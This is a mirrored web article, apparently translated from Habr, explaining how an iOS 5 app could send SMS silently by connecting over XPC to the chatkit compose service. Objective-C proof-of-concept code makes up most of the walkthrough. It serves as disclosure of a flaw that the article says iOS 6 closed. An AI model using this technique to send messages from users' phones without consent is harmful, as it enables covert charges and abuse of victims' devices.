<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Your flashlight can send SMS: one more reason to upgrade your device to iOS 6</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Today I will not tell you how the security system of iOS 5 works. And we will not collect crumbs of information through undocumented features. We will...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Your flashlight can send SMS: one more reason to upgrade your device to iOS 6</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/storage2/c88/102/971/c8810297106004b026350a955439cc00.jpg" align="left"><br><br>  Today I will not tell you how the security system of iOS 5 works. And we will not collect crumbs of information through undocumented features.  We will simply send an SMS from the application without the user's knowledge. <br><br><a name="habracut"></a>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      The network has very little information describing the motility of the low-level work of iOS.  These crumbs do not allow to restore the picture as a whole.  Many header files have closed source behind them.  Most steps have to be done almost blindly.  The ‚Äúmother‚Äù of the mobile platform, MacOS X, becomes the main field for experimentation. <br><br>  One of the interprocess communication systems in MacOS is <a href="http://developer.apple.com/library/mac/documentation/System/Reference/XPCServicesFW/XPCServicesFW.pdf">XPC</a> .  This system layer is made for interprocess communication based on the transfer of plist structures using libSystem and launchd.  In essence, this is an interface that allows you to manage processes by exchanging structures of the form dictionary.  And thanks to the inheritance, iOS 5 also has this mechanism. <br><br>  You probably already understood what I wanted to say with this introduction.  Yes, iOS has system services that have the facilities for XPC interaction.  And in my example, I would like to demonstrate the technique of working with the daemon to send SMS messages.  However, first of all, you need to say the following: <b>this feature is closed in iOS 6</b> , but is relevant for iOS 5.0‚Äì5.1.1.  Jailbreak, Private Framework and other illegal means are not required for its implementation.  You only need a set of header files from the / usr / include / xpc / * directory on your MacOS. <br><br>  In the iOS operating system, one of the elements for sending SMS-messages is the system service com.apple.chatkit, whose tasks include the formation, management and sending of short text messages.  For ease of management, it has a public communication port com.apple.chatkit.clientcomposeserver.xpc.  Using the XPC subsystem, you can form and send messages without user confirmation. <br><br><br><br>  Well, let's try to create a connection. <br><br><pre><code class="objectivec hljs">xpc_connection_t myconnection; <span class="hljs-built_in"><span class="hljs-built_in">dispatch_queue_t</span></span> queue = dispatch_queue_create(<span class="hljs-string"><span class="hljs-string">"com.apple.chatkit.clientcomposeserver.xpc"</span></span>, DISPATCH_QUEUE_CONCURRENT); myconnection = xpc_connection_create_mach_service(<span class="hljs-string"><span class="hljs-string">"com.apple.chatkit.clientcomposeserver.xpc"</span></span>, queue, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);</code> </pre> <br><br>  Now we have myconnection XPC connection to the service for sending SMS.  However, XPC is designed in such a way that the connection is created in a ‚Äúfrozen‚Äù form: to activate it, we will need one more step. <br><br><pre> <code class="objectivec hljs">xpc_connection_set_event_handler(myconnection, ^(xpc_object_t event) { xpc_type_t xtype = xpc_get_type(event); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(XPC_TYPE_ERROR == xtype) { <span class="hljs-built_in"><span class="hljs-built_in">NSLog</span></span>(<span class="hljs-string"><span class="hljs-string">@"XPC sandbox connection error: %s\n"</span></span>, xpc_dictionary_get_string(event, XPC_ERROR_KEY_DESCRIPTION)); } <span class="hljs-comment"><span class="hljs-comment">// Always set an event handler. NSLog(@"Received an message event!"); }); xpc_connection_resume(myconnection);</span></span></code> </pre><br><br>  We animate the connection.  On iOS 6, at this very moment you will see in the phone log a message stating that this kind of interaction is prohibited.  Now we need to create a dictionary similar to xpc_dictionary, with the necessary data to send a message. <br><br><pre> <code class="objectivec hljs"><span class="hljs-built_in"><span class="hljs-built_in">NSArray</span></span> *receipements = [<span class="hljs-built_in"><span class="hljs-built_in">NSArray</span></span> arrayWithObjects:<span class="hljs-string"><span class="hljs-string">@"+7 (90*) 000-00-00"</span></span>, <span class="hljs-literal"><span class="hljs-literal">nil</span></span>]; <span class="hljs-built_in"><span class="hljs-built_in">NSData</span></span> *ser_rec = [<span class="hljs-built_in"><span class="hljs-built_in">NSPropertyListSerialization</span></span> dataWithPropertyList:receipements format:<span class="hljs-number"><span class="hljs-number">200</span></span> options:<span class="hljs-number"><span class="hljs-number">0</span></span> error:<span class="hljs-literal"><span class="hljs-literal">NULL</span></span>]; xpc_object_t mydict = xpc_dictionary_create(<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>); xpc_dictionary_set_int64(mydict, <span class="hljs-string"><span class="hljs-string">"message-type"</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>); xpc_dictionary_set_data(mydict, <span class="hljs-string"><span class="hljs-string">"recipients"</span></span>, [ser_rec bytes], [ser_rec length]); xpc_dictionary_set_string(mydict, <span class="hljs-string"><span class="hljs-string">"text"</span></span>, <span class="hljs-string"><span class="hljs-string">"hello from your application!"</span></span>);</code> </pre><br><br>  It remains a bit: send a message to the XPC port and make sure that it is delivered. <br><br><pre> <code class="objectivec hljs">xpc_connection_send_message(myconnection, mydict); xpc_connection_send_barrier(myconnection, ^{ <span class="hljs-built_in"><span class="hljs-built_in">NSLog</span></span>(<span class="hljs-string"><span class="hljs-string">@"Message has been successfully delievered"</span></span>); });</code> </pre><br><br>  The sound of an SMS sent to a short number. <br>  So, until this feature was removed in iOS 6, any application had the ability to send SMS messages without the user's knowledge.  In iOS 6, Apple has added an additional security layer that does not allow connecting to this service from the sandbox. <br><br>  Thanks for attention! </div><p>Source: <a href="https://habr.com/ru/post/155937/">https://habr.com/ru/post/155937/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../155925/index.html">How peaceful reverse engineering helped slightly improve the Yandex.Money application</a></li>
<li><a href="../155927/index.html">Working with static pages in Yii</a></li>
<li><a href="../155929/index.html">VPN for iPhone</a></li>
<li><a href="../155933/index.html">Defragmentation indices with the collection of statistics MS SQL 2008 R2</a></li>
<li><a href="../155935/index.html">Do you need a button for sites (like) that will remind the user about the event (thereby returning the audience and increasing the conversion)?</a></li>
<li><a href="../155941/index.html">2GIS - Hotel Expert</a></li>
<li><a href="../155943/index.html">SHORT'Y - the release of short news from October 24</a></li>
<li><a href="../155945/index.html">IDCEE 2012 - the second day</a></li>
<li><a href="../155949/index.html">From idea to gadget. The path of "Samurai" in Russia</a></li>
<li><a href="../155951/index.html">HighLoad 2012</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>